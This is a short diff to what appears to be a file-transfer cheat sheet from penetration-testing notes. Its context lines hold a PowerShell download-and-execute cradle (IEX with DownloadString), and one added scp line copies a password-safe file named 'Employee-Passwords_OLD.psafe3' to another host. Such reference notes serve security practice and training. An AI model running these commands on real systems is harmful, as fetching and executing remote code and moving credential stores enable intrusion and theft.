@@ -25,7 +25,8 @@ IEX (New-Object Net.WebClient).DownloadString('https://example.com/test.txt')
 Invoke-WebRequest https://example.com/test.txt -OutFile test.txt -UseBasicParsing
 
 **Secure Copy**
-scp file.txt user@192.168.1.10:/tmp/
+Linux: scp file.txt user@192.168.1.10:/tmp/ 
+Windows: scp Employee-Passwords_OLD.psafe3 hwilliam@172.16.119.7:C:\Users\hwilliam\Desktop\
 
 
 
